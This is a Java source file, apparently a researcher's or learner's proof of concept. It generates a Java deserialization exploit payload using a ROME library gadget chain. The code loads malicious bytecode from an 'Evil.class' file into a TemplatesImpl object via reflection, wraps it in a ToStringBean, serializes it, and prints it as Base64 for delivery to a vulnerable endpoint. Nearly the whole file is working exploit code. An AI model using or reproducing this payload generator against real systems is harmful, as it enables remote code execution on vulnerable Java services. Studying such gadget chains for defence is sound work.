package Rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;


public class Rome2 {

    public static void unserialize(byte[] bytes) throws Exception{
        ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
        ObjectInputStream oin = new ObjectInputStream(bain);
        oin.readObject();
    }


    public static byte[] serialize(Object o) throws Exception{
        try(ByteArrayOutputStream baout = new ByteArrayOutputStream();
            ObjectOutputStream oout = new ObjectOutputStream(baout)){
            oout.writeObject(o);
            return baout.toByteArray();
        }
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static void main(String[] args) throws Exception {
        //恶意字节码
        byte[] code = Files.readAllBytes(Paths.get("D:\\project\\java\\cc1\\src\\main\\java\\Rome\\Evil.class"));
//        byte[] code = Files.readAllBytes(Paths.get("D:\\project\\java\\test\\target\\classes\\calc1.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","sk1y");  //不能设置为null，不然返回null
        setFieldValue(templates,"_class",null);
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
//        toStringBean.toString();
        byte[] aaa = serialize(toStringBean);
        System.out.println(Base64.getEncoder().encodeToString(aaa));
    }
}
